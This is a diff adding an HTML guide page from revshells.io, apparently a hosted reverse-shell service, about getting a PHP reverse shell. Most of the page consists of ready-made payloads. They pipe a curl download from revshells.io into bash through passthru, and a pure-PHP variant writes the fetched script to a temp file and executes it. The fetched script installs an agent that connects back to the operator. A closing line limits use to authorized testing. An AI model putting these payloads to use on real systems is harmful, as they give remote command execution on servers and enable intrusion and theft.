@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>PHP reverse shell callbacks | revshells.io</title>
+<meta name="description" content="PHP reverse shell using revshells.io: invoke your session bootstrap from file_get_contents, exec, or passthru without hosting your own listener.">
+<meta name="robots" content="index,follow">
+<link rel="canonical" href="https://revshells.io/articles/php-reverse-shell">
+<meta property="og:type" content="article">
+<meta property="og:site_name" content="revshells.io">
+<meta property="og:title" content="PHP reverse shell callbacks | revshells.io">
+<meta property="og:description" content="PHP reverse shell using revshells.io: invoke your session bootstrap from file_get_contents, exec, or passthru without hosting your own listener.">
+<meta property="og:url" content="https://revshells.io/articles/php-reverse-shell">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="PHP reverse shell callbacks | revshells.io">
+<meta name="twitter:description" content="PHP reverse shell patterns that fetch and run your revshells.io session bootstrap.">
+<!-- __ANALYTICS_LOCAL__ -->
+<link rel="icon" type="image/svg+xml" href="/static/favicon.svg">
+<link rel="stylesheet" href="/static/common.css">
+</head>
+<body>
+<header class="topbar">
+  <a href="/" class="brand">
+    <div class="brand-logo">rsd</div>
+    <div class="brand-text">
+      <span class="brand-name">revshells.io</span>
+      <span class="brand-version" id="rsd-version">v0.0.0</span>
+    </div>
+  </a>
+  <div class="topbar-actions">
+    <a href="/articles" class="btn">Guides</a>
+    <a href="/" class="btn btn-primary">Create session</a>
+    <button type="button" class="btn icon-btn" id="theme-toggle" title="Toggle theme">☀️</button>
+  </div>
+</header>
+
+<main class="article-main">
+  <h1>PHP reverse shell with revshells.io</h1>
+  <p class="article-lead">Classic PHP reverse shells often embed a hard-coded attacker IP and a raw TCP socket. revshells.io replaces that with an HTTPS callback: your PHP code only needs to fetch and execute the session bootstrap once.</p>
+
+  <h2>1. Create a session</h2>
+  <p>From <a href="/">revshells.io</a>, create a session and copy your session ID.</p>
+
+  <h2>2. Invoke the bootstrap from PHP</h2>
+  <p>If <code>shell_exec</code> / <code>exec</code> / <code>passthru</code> are allowed and <code>curl</code> exists on the host:</p>
+  <pre>passthru('curl -fsSL https://revshells.io/SESSION-ID/revshell | bash');</pre>
+  <p>Prefer no-PTY when running from a web request (short-lived, no TTY):</p>
+  <pre>passthru('curl -fsSL https://revshells.io/SESSION-ID/nopty | bash');</pre>
+
+  <h2>3. Pure PHP fetch (no shell functions)</h2>
+  <p>When only HTTP wrappers work, pull the bootstrap script and pipe through <code>/bin/sh</code> if permitted:</p>
+  <pre>$script = file_get_contents('https://revshells.io/SESSION-ID/revshell');
+$tmp = tempnam(sys_get_temp_dir(), 'rs');
+file_put_contents($tmp, $script);
+chmod($tmp, 0755);
+exec($tmp);</pre>
+  <p>The bootstrap is a shell script that downloads <code>rs-agent</code> and connects back to your session.</p>
+
+  <h2>4. Operate the callback</h2>
+  <p>Watch the session page on revshells.io for the beacon to connect, then use the built-in terminal or <code>rsctl attach</code>.</p>
+
+  <nav class="article-nav">
+    <a class="btn" href="/articles/bash-reverse-shell">← Bash guide</a>
+    <a class="btn" href="/articles/python-reverse-shell">Python guide →</a>
+  </nav>
+
+  <p class="article-disclaimer">For authorized security testing, CTFs, and lab environments only.</p>
+</main>
+
+<script>window.RSD_VERSION = '__RSD_VERSION__';</script>
+<script src="/static/common.js"></script>
+<script>rsdInitTopbar();</script>
+</body>
+</html>
